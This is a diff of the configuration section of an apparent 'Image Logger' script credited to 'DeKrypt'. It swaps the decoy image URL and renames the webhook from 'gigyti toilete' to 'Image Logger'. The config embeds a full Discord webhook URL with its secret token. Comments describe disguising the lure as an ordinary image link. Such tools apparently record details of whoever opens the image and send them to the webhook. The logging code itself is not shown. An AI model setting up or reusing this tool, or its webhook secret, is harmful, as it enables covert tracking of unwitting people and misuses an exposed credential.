@@ -13,12 +13,12 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1463470675384729652/pugi2oFCL0ULfTNkLRFlBTN-EsKsrUEOSwYwe3WKLuf6EAjNhpuWANJAvBpTL91OVW6s",
-    "image": "https://imgs.search.brave.com/FOALbx1T8IPKYn-5yMQ1dSEechkHYnpo8DvSxE-7KcM/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly93d3cu/Ym9yZWRwYW5kYS5j/b20vYmxvZy93cC1j/b250ZW50L3VwbG9h/ZHMvMjAyNS8wNC82/ODAyNDlmODRmMmE5/X2Z1bm55LWN1dGUt/Y2F0LXBpY3MuanBn", # You can also have a custom image by using a URL argument
-                                             # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "image": "https://search.brave.com/images?q=random+pic&context=W3sic3JjIjoiaHR0cHM6Ly90aHVtYnMuZHJlYW1zdGltZS5jb20vYi9yYW5kb20tY2xpY2staS1jbGlja2VkLXBpYy1teS1mcmllbmQtd2FzLWNsaWNraW5nLWZsb3dlcnMtcGljdHVyZXMtOTYwNjg4MjIuanBnIiwidGV4dCI6IkkgY2xpY2tlZCB0aGlzIHBpYyB3aGVuIG15IGZyaWVuZCB3YXMgY2xpY2tpbmcgZmxvd2VycyBwaWN0dXJlcy4gUmFuZG9tIHBpYyBzdG9jayBpbWFnZXMsIHJveWFsdHktZnJlZSBwaG90b3MgYW5kIHBpY3R1cmVzIiwicGFnZV91cmwiOiJodHRwczovL3d3dy5kcmVhbXN0aW1lLmNvbS9waG90b3MtaW1hZ2VzL3JhbmRvbS1waWMuaHRtbCJ9XQ%3D%3D&sig=749316d7db797861f79f6ec3d16aa350f7905e27c622c2420f0dbc90c7a0e4bd&nonce=148c87a6448341a2a7d7b4218725b6e5&source=imageCluster", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "gigyti toilete", # Set this to the name you want the webhook to have
+    "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
